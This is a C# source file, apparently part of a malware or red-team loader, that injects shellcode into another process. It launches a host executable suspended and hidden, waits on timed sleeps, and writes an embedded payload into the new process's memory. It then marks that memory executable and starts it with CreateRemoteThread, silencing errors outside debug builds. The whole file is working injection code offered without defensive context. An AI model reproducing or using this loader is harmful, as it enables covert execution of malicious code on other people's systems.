using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Native;

namespace Inject
{
    public class Entry
    {
        
        public static int? CreateProcess(string appPath)
        {
            var pInfo = new Kernel32.PROCESS_INFORMATION();
            var sInfoEx = new Kernel32.STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {

                var pSec = new Kernel32.SECURITY_ATTRIBUTES();
                var tSec = new Kernel32.SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                if (Kernel32.CreateProcess(appPath, null, ref pSec, ref tSec, false, (uint)(Kernel32.CreationFlags.ExtendedStartupInfoPresent | Kernel32.CreationFlags.CreateSuspended | Kernel32.CreationFlags.CreateNoWindow), IntPtr.Zero, null, ref sInfoEx, out pInfo))
                {
                    return Kernel32.GetProcessId(pInfo.hProcess);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Kernel32.CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    Kernel32.CloseHandle(pInfo.hThread);
                }
            }
            return null;
        }

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Inject.");
#endif
            try
            {
                Thread.Sleep(20000);
#if DEBUG
                Console.WriteLine("Creating Process !");
#endif
                var procRes = CreateProcess(Properties.Resources.Host);
                if (!procRes.HasValue)
                    throw new InvalidOperationException($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");
                
#if DEBUG
                Console.WriteLine("Process Created !");
#endif
                Thread.Sleep(30000);

                Process process = Process.GetProcessById(procRes.Value);
                IntPtr pHandle = process.Handle;

                var shellcode = Properties.Resources.Payload;


                var baseAddress = Native.Kernel32.VirtualAllocEx(
                    pHandle,
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ReadWrite);

                if (baseAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                    throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

                if (bytesWritten.ToInt32() != shellcode.Length)
                    throw new InvalidOperationException($"Failed to write All the shellcode into the process");

                if (!Native.Kernel32.VirtualProtectEx(
                    pHandle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                
                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
            }
            finally
            {
                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }


            Thread.Sleep(5000);

#if DEBUG
            Console.WriteLine("End Injects !");
#endif
        }
    }
}
